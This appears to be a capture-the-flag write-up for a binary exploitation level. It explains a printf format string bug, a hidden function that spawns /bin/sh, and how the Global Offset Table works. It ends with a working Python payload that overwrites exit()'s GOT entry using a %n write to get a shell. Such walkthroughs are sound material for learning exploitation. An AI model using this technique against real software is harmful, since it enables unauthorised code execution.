* In this level5 the main call a function n() which asks for input and pass it as a format parameter to printf . 
* info functions in gdb shows that there actualy a secret function o() which do a call to system("/bin/sh")

* to solve this level we have to overwrite GOT table of the exit() in n function, so we jump to o() instead of the real exit()

what is got ??
* The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked.
most programs don't include every function they use to reduce binary size. Instead,
common functions (like those in libc) are "linked" into the program so they can be saved once on disk and reused by every program.

* the following code is used to pwn level5:
----------------------------------------
import struct

exit_got = struct.pack("I", 0x8049838)
print exit_got + " %134513824p" + "%4$n"
---------------------------------------------
